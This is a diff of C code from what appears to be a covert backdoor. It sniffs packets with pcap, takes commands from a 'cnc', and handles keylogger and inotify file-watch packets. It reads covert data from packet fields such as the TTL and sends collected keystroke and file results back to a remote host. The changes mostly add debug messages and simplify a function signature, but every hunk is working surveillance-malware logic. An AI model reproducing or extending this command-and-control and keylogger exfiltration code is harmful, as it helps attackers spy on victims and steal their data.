@@ -111,13 +111,16 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
             case COMMAND:
                 Filter->flag = COMMAND;
                 if(Filter->tcp == false) {
+                    printf("Received UDP Command\n");
                     WriteUDPFile(ip->ip_ttl);
                 } else {
-                    WriteTCPFile(ip->ip_ttl, packet);
+                    printf("Received TCP Command\n");
+                    WriteTCPFile(packet);
                 }
 
                 break;
             case KEYLOGGER:
+                printf("Received Keylogger packet\n");
                 Filter->flag = KEYLOGGER;
                 src = ip->ip_src;
                 printf("source: %d", ntohs(src.s_addr));
@@ -128,6 +131,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                 }
                 break;
             case INOTIFY:
+                printf("Received Inotify packet\n");
                 Filter->flag = INOTIFY;
                 printf("INOTIFY\n");
 
@@ -135,14 +139,16 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                 if(Filter->tcp == false) {
                     WriteUDPFile(ip->ip_ttl);
                 } else {
-                    WriteTCPFile(ip->ip_ttl, packet);
+                    WriteTCPFile(packet);
                 }
 
                 break;
             case EOT:   //wait for EOT packet before sending results back to the cnc
-                printf("EOT\n");
+                printf("Received EOT packet\n");
                 switch(Filter->flag) {
                     case COMMAND:
+                        printf("EOT Command packet\n");
+
                         Filter->flag = COMMAND;
                         src = ip->ip_src;
                         printf("source: %d", ntohs(src.s_addr));
@@ -155,11 +161,15 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                         }
                         break;
                     case KEYLOGGER:
+                        printf("EOT Keylogger packet\n");
                         sleep(1);
                         send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
                         break;
                     case INOTIFY:
-                        //read from the results file
+                        printf("EOT Inotify packet\n");
+
+                        sleep(1);
+
                         if((fp = fopen(FILENAME, "rb+")) < 0){
                             perror("fopen");
                             exit(1);
@@ -200,7 +210,6 @@ void WriteUDPFile(int ttl) {
     if(ttl == 4) {
         fclose(fp);
         pcap_breakloop(interfaceinfo);
-
     }
 
     char ch[1];
@@ -211,7 +220,7 @@ void WriteUDPFile(int ttl) {
     fclose(fp);
 }
 
-void WriteTCPFile(int ttl, const u_char* packet) {
+void WriteTCPFile(const u_char* packet) {
     FILE *fp;
 
     if((fp = fopen(FILENAME, "wb+")) < 0){
@@ -229,7 +238,6 @@ void WriteTCPFile(int ttl, const u_char* packet) {
         exit(1);
     }
     fclose(fp);
-
 }
 
 const unsigned char *ParseTCPPayload(const u_char* packet) {
